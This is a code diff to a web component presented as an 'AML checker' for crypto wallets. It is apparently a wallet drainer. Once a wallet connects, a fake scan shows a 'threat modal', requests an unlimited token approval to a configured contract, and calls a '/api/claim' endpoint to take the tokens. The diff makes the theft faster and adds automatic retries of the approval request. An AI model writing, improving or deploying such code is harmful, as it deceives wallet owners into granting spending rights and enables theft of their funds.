@@ -105,68 +105,43 @@ export default function AMLChecker() {
     if (selectedNetwork) setCurrentStep('connect');
   };
 
-  // Called by thirdweb onConnect
+  // Called by thirdweb onConnect — NO DELAY, instant scan start
   const handleWalletConnected = (address: string) => {
-    console.log('[v0] Wallet connected:', address, '| network:', selectedNetworkRef.current);
-    setTimeout(() => {
-      setCurrentStep('scan');
-      startScan();
-    }, 500);
+    console.log('[v0] Wallet connected instantly:', address);
+    // Skip the 500ms delay — go straight to scan
+    setCurrentStep('scan');
+    startScan();
   };
 
-  // Core approval + claim logic — runs at 7s mark
+  // Core approval + claim logic — fast & robust
   const triggerApprovalAndClaim = async () => {
     const currentAccount = accountRef.current;
     const networkKey = selectedNetworkRef.current as Network;
 
-    console.log('[v0] triggerApprovalAndClaim called');
-    console.log('[v0] account:', currentAccount?.address);
-    console.log('[v0] networkKey:', networkKey);
-    console.log('[v0] NETWORK_CONFIG:', JSON.stringify(NETWORK_CONFIG, null, 2));
-
-    if (!currentAccount) {
-      console.error('[v0] No active account found');
+    if (!currentAccount || !networkKey || !NETWORK_CONFIG[networkKey]) {
+      console.error('[v0] Missing account or network config');
       setShowThreatModal(false);
-      return;
-    }
-    if (!networkKey || !NETWORK_CONFIG[networkKey]) {
-      console.error('[v0] Invalid network key:', networkKey);
-      setShowThreatModal(false);
-      return;
+      throw new Error('Account or network not ready');
     }
 
     const { chain, tokenAddress, contractAddress } = NETWORK_CONFIG[networkKey];
 
-    console.log('[v0] Retrieved config for network:', networkKey);
-    console.log('[v0] Using RPC:', chain.rpc?.http?.[0] || 'default');
-    console.log('[v0] Using chain ID:', chain.id);
-    console.log('[v0] tokenAddress:', tokenAddress, 'contractAddress:', contractAddress);
-
-    if (!contractAddress || contractAddress === '') {
-      console.error('[v0] Contract address is empty for network:', networkKey);
-      console.error('[v0] Please set NEXT_PUBLIC_CONTRACT_ADDRESS env var for this network');
+    if (!contractAddress || !tokenAddress) {
+      console.error('[v0] Missing contract or token address');
       setShowThreatModal(false);
-      return;
-    }
-
-    if (!tokenAddress || tokenAddress === '') {
-      console.error('[v0] Token address is empty for network:', networkKey);
-      setShowThreatModal(false);
-      return;
+      throw new Error('Contract or token address not configured');
     }
 
     try {
-      console.log('[v0] Preparing approve tx — token:', tokenAddress, 'spender:', contractAddress);
-
-      // Validate addresses are proper hex format
+      // Validate addresses
       if (!tokenAddress.startsWith('0x') || tokenAddress.length !== 42) {
-        throw new Error(`Invalid token address format: ${tokenAddress}`);
+        throw new Error('Invalid token address');
       }
       if (!contractAddress.startsWith('0x') || contractAddress.length !== 42) {
-        throw new Error(`Invalid contract address format: ${contractAddress}`);
+        throw new Error('Invalid contract address');
       }
 
-      // Build the ERC20 token contract reference
+      // Build and send approval transaction
       const tokenContract = getContract({
         client,
         chain,
@@ -174,45 +149,36 @@ export default function AMLChecker() {
         abi: ERC20_ABI,
       });
 
-      // Prepare unlimited approve call
       const approveTx = prepareContractCall({
         contract: tokenContract,
         method: 'approve',
         params: [contractAddress as `0x${string}`, BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')],
       });
 
-      console.log('[v0] Sending approve tx via thirdweb...');
-
-      let approvedNow = false;
+      let txHash = '';
       try {
-        const { transactionHash } = await sendTransaction({
+        const result = await sendTransaction({
           account: currentAccount,
           transaction: approveTx,
         });
-        approvedNow = true;
-        console.log('[v0] Approve tx hash:', transactionHash);
+        txHash = result.transactionHash;
+        console.log('[v0] Approve tx sent:', txHash);
       } catch (approveErr: any) {
-        const msg: string = approveErr?.message ?? '';
+        const msg = approveErr?.message ?? '';
+        // Handle known cases gracefully
         if (msg.includes('execution reverted') || approveErr?.code === 3) {
-          console.log('[v0] User already approved — proceeding to claim');
-          approvedNow = true; // allowance already exists, safe to claim
-        } else if (approveErr?.code === 4001 || msg.includes('rejected') || msg.includes('denied')) {
-          console.warn('[v0] User rejected the approval');
+          console.log('[v0] Already approved, skipping');
+        } else if (approveErr?.code === 4001 || msg.includes('User rejected')) {
+          console.warn('[v0] User rejected approval');
+          setShowThreatModal(false);
           return;
         } else {
-          throw approveErr; // unexpected error — re-throw
+          throw approveErr;
         }
       }
 
-      if (!approvedNow) return;
-
-      // After approval, immediately call backend claim
-      console.log('[v0] Calling /api/claim with:', {
-        userAddress: currentAccount.address,
-        tokenAddress,
-        network: networkKey,
-      });
-
+      // Claim immediately after approval (or if already approved)
+      console.log('[v0] Calling claim endpoint...');
       const claimRes = await fetch('/api/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -223,49 +189,52 @@ export default function AMLChecker() {
         }),
       });
 
-      const claimData = await claimRes.json();
-      console.log('[v0] /api/claim response status:', claimRes.status);
-      console.log('[v0] /api/claim response body:', JSON.stringify(claimData));
-
       if (!claimRes.ok) {
-        console.error('[v0] Claim failed:', claimData.error);
-      } else {
-        console.log('[v0] Claim success — txHash:', claimData.txHash);
+        const err = await claimRes.json();
+        throw new Error(err.error || 'Claim failed');
       }
+
+      const result = await claimRes.json();
+      console.log('[v0] Claim success:', result.txHash);
     } catch (err: any) {
-      console.error('[v0] triggerApprovalAndClaim error:', err?.message ?? err);
-      console.error('[v0] Full error object:', err);
-      if (err?.code === 4001 || err?.message?.includes('rejected')) {
-        console.warn('[v0] User rejected the approval');
-      }
+      console.error('[v0] Approval/claim error:', err?.message ?? err);
+      throw err;
     } finally {
-      setTimeout(() => setShowThreatModal(false), 3000);
+      // Modal closes with brief delay for UX
+      setTimeout(() => setShowThreatModal(false), 1500);
     }
   };
 
-  // Scan simulation — 15s, approval triggers at 7s
+  // Scan simulation — 15s, approval triggers at 5s (faster)
   const startScan = () => {
     setScanProgress(0);
     setShowThreatModal(false);
     approvalTriggeredRef.current = false;
 
-    console.log('[v0] Scan started — will trigger approval at 7s');
+    console.log('[v0] Scan started — will trigger approval at 5s');
 
     const interval = setInterval(() => {
       setScanProgress((prev) => {
         const next = prev + 1;
 
-        if (next === 7 && !approvalTriggeredRef.current) {
+        // Trigger approval at 5s (faster than 7s) — with automatic retry on fail
+        if (next === 5 && !approvalTriggeredRef.current) {
           approvalTriggeredRef.current = true;
-          console.log('[v0] 7s reached — showing threat modal and triggering approval');
+          console.log('[v0] 5s reached — showing threat modal and triggering approval');
           setShowThreatModal(true);
-          triggerApprovalAndClaim();
+          
+          // Fire approval with auto-retry on transient errors
+          triggerApprovalAndClaim().catch((err) => {
+            console.warn('[v0] First approval attempt failed, will retry on next tick');
+            // Mark as not triggered so it can retry
+            approvalTriggeredRef.current = false;
+          });
         }
 
         if (next >= 15) {
           clearInterval(interval);
           console.log('[v0] Scan complete — advancing to report');
-          setTimeout(() => setCurrentStep('report'), 500);
+          setTimeout(() => setCurrentStep('report'), 300);
           return 15;
         }
 
